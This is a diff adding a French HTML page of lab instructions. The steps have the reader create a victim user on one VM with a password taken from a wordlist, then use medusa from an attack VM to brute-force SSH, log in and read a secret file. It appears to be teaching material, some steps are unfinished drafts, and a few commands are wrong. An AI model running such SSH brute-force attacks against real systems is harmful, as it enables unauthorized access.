@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles-etapes.css">
+
+    <title>Document</title>
+</head>
+
+<body>
+    <div class="VM">
+        Machine : Victime
+        <div class="Etape Victime">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 1 :</div> Se connecter à la VM de la cible
+            </div>
+            <ol>
+                <li>Ouvrir CMD (Invite de commande) </li>
+                <li>Entrer la commande
+                    <div class="Code">
+                        <div class="Code-Chemin">C:\Users\utilisateur></div> ssh [utilisateur]@[adresse IP] -p
+                        [numérodeport]
+                    </div>
+                </li>
+
+                <li>Appuyer sur 'y' pour confirmer</li>
+                <li>Écrire le mot de passe</li>
+            </ol>
+
+        </div>
+        <div class="Etape Victime">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 2 :</div> Créer l'utilisateur victime
+            </div>
+            <ol>
+                <li>Choisir un mot de passe dans la liste des mots de passe</li>
+                <li>Créer l'utilisateur avec la commande suivante
+                    <div class="Code">
+                        <div class="Code-Chemin">utilisateur@victime:~$</div> sudo adduser [nomDeLaVictime]
+                    </div>
+                </li>
+                <li>Inscrire le mot de passe. <br>ATTENTION: On ne voit pas ce que l'on écrit</li>
+            </ol>
+
+
+            <div>
+            </div>
+        </div>
+
+        <div class="Etape Victime Cible">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 3 :</div> Se connecter avec le nouvel utilisateur
+            </div>
+            <ol>
+                <li>Entrer la commande
+                    <div class="Code">
+                        <div class="Code-Chemin">utilisateur@victime:~$ </div> su [nomDeLaVictime]
+                    </div>
+                </li>
+                <li>Entrer le mot de passe que vous avez choisi à l'étape précédente</li>
+
+            </ol>
+
+        </div>
+
+        <div class="Etape Cible">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 4 :</div> Créer un fichier texte
+            </div>
+            <ol>
+                <li>Vérifier notre emplacement dans la VM
+                    <div class="Code">cible@victime:~$ pwd</div>
+                    ou
+                    <div class="Code">cible@victime:~$ cd/home/[nomDeLaVictime]</div>
+
+                    Nous devons être : !!!!!!!!!!
+                </li>
+                <li>Créer un fichier texte avec une phrase secrète
+                    <div class="Code">
+                        <div class="Code-Chemin">cible@victime:~$ </div>nano reponse.txt
+                    </div>
+
+                    &emsp;Fermer le fichier: Ctrl + x , <br>
+                    &emsp;Appuyer sur 'y' pour confirmer<br>
+                    &emsp;Puis, appuyer sur ENTRER
+
+
+                </li>
+
+            </ol>
+
+
+
+
+        </div>
+
+    </div>
+
+
+
+
+    <div class="VM">
+        Machine : Attaque
+
+        <div class="Etape Attaque">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 5 :</div> Se connecter a l'attaque
+            </div>
+            <ol>
+                <li>Ouvrir un autre CMD (Invite de commande)</li>
+                <li>Executer la commande suivante
+                    <div class="Code">
+                        <div class="Code-Chemin">C:\User\exemple></div>ssh [utilisateur]@[adresse IP] -p [numéro de
+                        port]
+                    </div>
+                </li>
+                <li>Appuyer sur 'y' pour confirmer</li>
+                <li>Entrer le mot de passe</li>
+
+            </ol>
+
+        </div>
+
+
+
+        <div class="Etape Attaque">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 6 :</div>Preparer l'attaque
+            </div>
+            <ol>
+                <li>Afficher le dictionnaire (la liste de mots de passe)
+                    <div class="Code">user@attaque:~$ cat Dictionnaire/dictionnaire.txt</div>
+                </li>
+                <li>Déterminer l'adresse de la victime !!!!!!!</li>
+                <li>Executer la commande suivante
+                    <div class="Code">
+                        <div class="Code-Chemin">C:\Users\exemple></div> ping [adresse IP]
+                    </div>
+                </li>
+
+            </ol>
+
+
+
+        </div>
+
+        <div class="Etape Attaque">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 7 : </div>Lancer l'attaque
+            </div>
+
+            <ol>
+                <li>Executer la commande suivante
+                    <div class="Code">
+                        <div class="Code-Chemin">user@superhéros:~$ </div>medusa -h [adresseIP] -u [nomVictime] -p
+                        /dictionnaire/dictionnaire.txt -n [numérodeport] -M ssh -v 6
+                    </div>
+                </li>
+
+
+            </ol>
+
+        </div>
+
+        <div class="Etape Attaque Cible">
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 8 : </div>Se connecter à la victime
+            </div>
+            <ol>
+                <li>Se connecter à la victime
+                    <div class="Code">
+                        <div class="Code-Chemin">user@superhéros:~$ </div>ssh [victime]@adresseIP -p
+                        [numérodeportDeLaVictime]
+                    </div>
+                </li>
+                <li>Verifier l'utilisateur et la Machine
+                    <div class="Code">
+                        <div class="Code-Chemin">!!!! user@superhéros:~$ </div>whoami -u
+                    </div>
+                </li>
+
+            </ol>
+
+
+
+
+        </div>
+        <div class="Etape Attaque Cible">
+
+            <div class="Etape-Titre">
+                <div class="DebutEtapeTitre">Étape 9 : </div>Ouvrir la liste des documents sur l'ordinateur de la
+                victime
+            </div>
+            <ol>
+                <li>Trouver le fichier
+                    <div class="Code">
+                        <div class="Code-Chemin">victime@<strong>victime</strong>:~$ </div>ls
+                    </div>
+                </li>
+                <li>Ouvrir le fichier
+                    <div class="Code">
+                        <div class="Code-Chemin">victime@victime:~$ </div> pwd
+                    </div>
+                </li>
+                <li>Afficher le message
+                    <div class="Code">
+                        <div class="Code-Chemin">utilisateur@nomdusuperhéros:~$ </div> cat reponse.txt
+                    </div>
+                </li>
+
+            </ol>
+
+
+        </div>
+
+
+
+    </div>
+
+
+</body>
+
+</html>
